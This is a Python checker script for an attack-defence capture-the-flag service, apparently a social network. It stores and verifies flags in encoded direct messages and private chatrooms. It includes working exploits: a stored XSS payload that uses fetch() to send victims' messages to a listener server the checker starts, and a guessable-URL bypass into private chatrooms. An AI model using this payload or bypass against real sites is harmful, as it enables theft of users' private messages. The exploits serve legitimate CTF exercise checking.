import json
import random
import secrets
from typing import Optional
from httpx import AsyncClient
from logging import LoggerAdapter
from enochecker3 import (
    ChainDB,
    Enochecker,
    GetflagCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    ExploitCheckerTaskMessage,
    HavocCheckerTaskMessage
)
from enochecker3.utils import FlagSearcher, assert_equals, assert_in
import time
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading
import hashlib

HOST = "0.0.0.0"
PORT = 6452

SERVICE_PORT = 3000
checker = Enochecker("asocialnetwork", SERVICE_PORT)
app = lambda: checker.app
getUrl = lambda task: f"http://{task.address + ':' + str(SERVICE_PORT)}"

def encode(message, recipient, logger):
    logger.debug(f"Encoding {message} for {recipient}")
    message = message.encode('utf-8').hex()
    recipient = recipient * (len(message) // len(recipient) + 1)
    encoded_message = "".join([chr(ord(message[i]) ^ ord(recipient[i])) for i in range(len(message))])
    encoded_message = encoded_message
    logger.debug(f"Encoded message: {encoded_message}")
    return encoded_message


async def register(task, client, username, password, logger):
    logger.debug(f"Registering as {username}:{password}")
    r = await client.post(f"{getUrl(task)}/register", json={"username": username, "password": password, "confirmPassword": password})
    assert_equals(r.status_code, 302, "registering failed")
    return r.cookies


async def login(task, client, username, password, logger):
    logger.debug(f"Logging in as {username}:{password}")
    r = await client.post(f"{getUrl(task)}/login", json={"username": username, "password": password})
    assert_equals(r.status_code, 302, "login failed")
    return r.cookies


async def sendMessage(task, client, recipient, message, logger):
    username = secrets.token_hex(32)
    password = 'password'
    encoded_message = encode(message, recipient, logger)
    cookie = await register(task, client, username, password, logger)
    await client.post(f"{getUrl(task)}/messages/", json={"recipient": recipient, "message": encoded_message}, cookies=cookie)
    return username, password, cookie


async def retrieveMessage(task, client, recipient, logger, username, password):
    cookie = await login(task, client, username, password, logger)
    logger.debug(f"Retrieving Message for {username}:{password}")
    r = await client.get(f"{getUrl(task)}/messages/{recipient}", cookies=cookie)
    assert_equals(r.status_code, 200, "retrieving message failed")
    return r

async def createChatroom(task, name, private, client, cookie, logger):
    logger.debug(f"Creating private chatroom {name}")
    r = await client.post(f"{getUrl(task)}/chatroom?roomname={name}&public={'false' if private else 'true'}", cookies=cookie)
    assert_equals(r.status_code, 200, "creating private chatroom failed")
    return r.text

@checker.putflag(0)
async def putflag0(task: PutflagCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB, logger: LoggerAdapter) -> str:
    flag = task.flag
    recipient = "admin"
    username, password, cookie = await sendMessage(task, client, recipient, flag, logger)
    r = await retrieveMessage(task, client, recipient, logger, username, password)
    assert_in(flag, r.text, "flag missing from messages")
    await chain_db.set("userdata", (username, password, flag))
    return json.dumps({'username': username})

@checker.getflag(0)
async def getflag0(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    start = time.time()
    try:
        username, password, flag = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")
    r = await retrieveMessage(task, client, "admin", logger, username, password)
    assert_in(task.flag, r.text, "flag missing from note")
    # xss(task, start, logger)
    
    
@checker.putflag(1)
async def putflag1(task: PutflagCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB, logger: LoggerAdapter) -> str:
    flag = task.flag
    username = secrets.token_hex(32)
    password = secrets.token_hex(32)
    cookie = await register(task, client, username, password, logger)
    roomName = secrets.token_hex(32)
    roomUrl = await createChatroom(task, roomName, True, client, cookie, logger)
    logger.debug(f"Created private chatroom {roomName} with url {roomUrl}")
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
    logger.debug(f"Got chatroom {r.text}")
    r = await client.post(f"{getUrl(task)}/chatroom/{roomUrl}/messages", json={"message": flag}, cookies=cookie)
    await chain_db.set("userdata", (username, password, flag, roomUrl))
    return json.dumps({'username': username})


@checker.getflag(1)
async def getflag1(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        username, password, flag, roomUrl = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")
    cookie = await login(task, client, username, password, logger)
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
    assert_in(task.flag, r.text, "flag missing from note")


@checker.putnoise(0)
async def putnoise0(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB, logger: LoggerAdapter) -> None:
    noise = secrets.token_hex(32)
    recipient = "admin"
    username, password, cookie = await sendMessage(task, client, recipient, noise, logger)
    await chain_db.set("noise", (username, password, noise))


@checker.getnoise(0)
async def getnoise0(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        username, password, noise = await db.get("noise")
    except KeyError:
        raise MumbleException("Missing database entry from putnoise")
    r = await retrieveMessage(task, client, "admin", logger, username, password)
    assert_in(noise, r.text, "noise missing from note")


@checker.putnoise(1)
async def putnoise1(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB, logger: LoggerAdapter) -> None:
    noise = secrets.token_hex(32)
    username = secrets.token_hex(32)
    password = secrets.token_hex(32)
    cookie = await register(task, client, username, password, logger)
    roomName = secrets.token_hex(32)
    roomUrl = await createChatroom(task, roomName, False, client, cookie, logger)
    logger.debug(f"Created private chatroom {roomName} with url {roomUrl}")
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
    assert_equals(r.status_code, 200, "retrieving chatroom failed")
    r = await client.post(f"{getUrl(task)}/chatroom/{roomUrl}/messages", json={"message": noise}, cookies=cookie)
    assert_equals(r.status_code, 302, "sending message failed")
    await chain_db.set("noise", (username, password, noise, roomUrl))
    
    
@checker.getnoise(1)
async def getnoise1(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        username, password, noise, roomUrl = await db.get("noise")
    except KeyError:
        raise MumbleException("Missing database entry from putnoise")
    cookie = await login(task, client, username, password, logger)
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
    assert_in(noise, r.text, "noise missing from note")


@checker.putnoise(2)
async def putnoise2(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                    logger: LoggerAdapter) -> None:
    noise = secrets.token_hex(32)
    username = secrets.token_hex(32)
    password = secrets.token_hex(32)
    cookie = await register(task, client, username, password, logger)
    roomName = secrets.token_hex(32)
    roomUrl = await createChatroom(task, roomName, True, client, cookie, logger)
    logger.debug(f"Created private chatroom {roomName} with url {roomUrl}")
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
    assert_equals(r.status_code, 200, "retrieving chatroom failed")
    r = await client.post(f"{getUrl(task)}/chatroom/{roomUrl}/messages",
                          json={"message": noise}, cookies=cookie)
    assert_equals(r.status_code, 302, "sending message failed")
    await chain_db.set("noise", (username, password, noise, roomUrl))


@checker.getnoise(2)
async def getnoise2(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        username, password, noise, roomUrl = await db.get("noise")
    except KeyError:
        raise MumbleException("Missing database entry from putnoise")
    cookie = await login(task, client, username, password, logger)
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
    assert_in(noise, r.text, "noise missing from note")


@checker.putnoise(3)
async def putnoise3(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                    logger: LoggerAdapter) -> None:
    username = secrets.token_hex(32)
    password = secrets.token_hex(32)
    cookie = await register(task, client, username, password, logger)
    profilePic = random.choice(range(1, 50))
    r = await client.post(f"{getUrl(task)}/profile-picture?pic={profilePic}", cookies=cookie)
    assert_equals(r.status_code, 200, "setting profile picture failed")
    await chain_db.set("noise", (username, password, profilePic))


@checker.getnoise(3)
async def getnoise3(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        username, password, profilePic = await db.get("noise")
    except KeyError:
        raise MumbleException("Missing database entry from putnoise")
    cookie = await login(task, client, username, password, logger)
    r = await client.get(f"{getUrl(task)}/home", cookies=cookie)
    logger.debug(f"Got home page: {r.text} looking for {profilePic}")
    assert_in(f"/assets/profile-pics/{profilePic}.jpg", r.text, "profile picture missing from home")


@checker.putnoise(4)
async def putnoise4(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                    logger: LoggerAdapter) -> None:
    username = secrets.token_hex(32)
    password = secrets.token_hex(32)
    message = secrets.token_hex(32)
    cookie = await register(task, client, username, password, logger)
    r = await client.post(f"{getUrl(task)}/profile/{username}/wall", json={'message': message}, cookies=cookie)
    assert_equals(json.loads(r.text), {'message': 'Message posted', 'status': 200}, "posting to wall failed")
    await chain_db.set("noise", (username, password, message))


@checker.getnoise(4)
async def getnoise4(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        username, password, message = await db.get("noise")
    except KeyError:
        raise MumbleException("Missing database entry from putnoise")
    cookie = await login(task, client, username, password, logger)
    r = await client.get(f"{getUrl(task)}/profile/{username}", cookies=cookie)
    assert_in(message, r.text, "message missing from profile")


@checker.havoc(0)
async def havoc0(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                    logger: LoggerAdapter) -> None:
    username = secrets.token_hex(32)
    password = secrets.token_hex(32)
    r = await client.post(f"{getUrl(task)}/login", json={"username": username, "password": password})
    assert_equals(r.status_code, 401, "login with invalid credentials succeeded")


@checker.havoc(1)
async def havoc1(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                    logger: LoggerAdapter) -> None:
    username = secrets.token_hex(32)
    password = secrets.token_hex(32)
    r = await client.post(f"{getUrl(task)}/register", json={"username": username, "password": password, "confirmPassword": password})
    assert_equals(r.status_code, 302, "register with valid credentials failed")
    r = await client.post(f"{getUrl(task)}/register", json={"username": username, "password": password})
    assert_equals(r.status_code, 400, "register with duplicate credentials succeeded")


@checker.havoc(2)
async def havoc2(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                    logger: LoggerAdapter) -> None:
    username = secrets.token_hex(32)
    password = secrets.token_hex(32)
    cookie = await register(task, client, username, password, logger)
    r = await client.get(f"{getUrl(task)}/profile/{username}", cookies=cookie)
    assert_equals(r.status_code, 200, "getting profile failed")


@checker.havoc(3)
async def havoc3(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                    logger: LoggerAdapter) -> None:
    username = secrets.token_hex(32)
    password = secrets.token_hex(32)
    encoded_message = encode(secrets.token_hex(32), secrets.token_hex(32), logger)
    cookie = await register(task, client, username, password, logger)
    r = await client.post(f"{getUrl(task)}/messages/", json={"recipient": secrets.token_hex(32), "message": encoded_message},
                      cookies=cookie)
    assert_equals(r.status_code, 404, "sending message to invalid recipient succeeded")


exploitMessage = "<script>function getText(){{let text='';let messages = document.getElementsByClassName(" \
                 "'message');for(let i = 0; i < messages.length; i++){{text += messages[i].innerHTML;}}return text;" \
                 " }}fetch('http://{0}:6452/', {{method: 'POST', body:'username=' + getText(),headers: {{ " \
                 "'Content-Type': 'application/x-www-form-urlencoded', }},}}); </script>"
result = [None]
webServer = [None]
def server(logger):
    class MyServer(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write("<html><head><title>ASocialNetwork</title></head>".encode())

        def do_POST(self):
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            logger.debug(post_data)
            result[0] = post_data.decode()
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write("<html><head><title>ASocialNetwork</title></head>".encode())
    webServer[0] = HTTPServer((HOST, PORT), MyServer)
    logger.debug("Server started http://%s:%s" % (HOST, PORT))
    try:
        webServer[0].serve_forever()
    except KeyboardInterrupt:
        pass

    webServer[0].server_close()
    print("Server stopped.")


@checker.exploit(0)
async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger:LoggerAdapter) -> Optional[str]:
    server_thread = threading.Thread(target=server, args=(logger, ))
    server_thread.start()
    username = secrets.token_hex(32)
    password = secrets.token_hex(32)
    cookie = await register(task, client, username, password, logger)
    target = json.loads(task.attack_info)['username']
    payload = encode(exploitMessage.format(task.address), target, logger)
    r = await client.post(f"{getUrl(task)}/messages/", json={"recipient": target, "message": payload}, cookies=cookie)
    assert_equals(r.status_code, 200, "exploit failed")
    start = time.time()
    xss_test(task, logger)
    logger.debug(f"took {time.time() - start} seconds")
    while not result[0]:
        time.sleep(0.01)
    startShutdown = time.time()
    webServer[0].shutdown()
    logger.debug(f"took {time.time() - startShutdown} seconds to shutdown")
    server_thread.join()
    logger.debug('Server stopped')
    if flag := searcher.search_flag(result[0]):
        return flag


def xss(task, start, logger):
    options = webdriver.ChromeOptions()
    options.add_argument('--headless=new')
    driver = webdriver.Chrome(ChromeDriverManager().install(), options=options)
    driver.get(f"{getUrl(task)}/messages/admin")
    reloads = 0
    while True:
        if time.time() - start > ((task.timeout / 1000) - 1):
            break
        driver.refresh()
        reloads += 1
    logger.debug(reloads)
    driver.quit()


def xss_test(task, logger):
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument('--no-sandbox')
    driver = webdriver.Chrome('/usr/lib/chromium-browser/chromedriver', options=chrome_options)
    driver.get(f"{getUrl(task)}/login")
    driver.execute_script(f"document.getElementById('username').value = '{json.loads(task.attack_info)['username']}';")
    driver.execute_script(f"document.getElementById('password').value = 'password';")
    driver.execute_script("document.getElementsByTagName('form')[0].submit();")
    driver.get(f"{getUrl(task)}/messages/admin")
    driver.close()

@checker.exploit(1)
async def exploit1(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger:LoggerAdapter) -> Optional[str]:
    username = secrets.token_hex(32)
    password = secrets.token_hex(32)
    cookie = await register(task, client, username, password, logger)
    target = json.loads(task.attack_info)['username']
    r = await client.get(f"{getUrl(task)}/profile/{target}", cookies=cookie)
    if len(r.text.split('<h3>')) < 2:
        return
    roomName = r.text.split('<h3>')[1].split('</h3>')[0]
    roomUrl = hashlib.sha256(roomName.encode()).hexdigest()
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
    if flag := searcher.search_flag(r.text):
        return flag

if __name__ == "__main__":
    checker.run()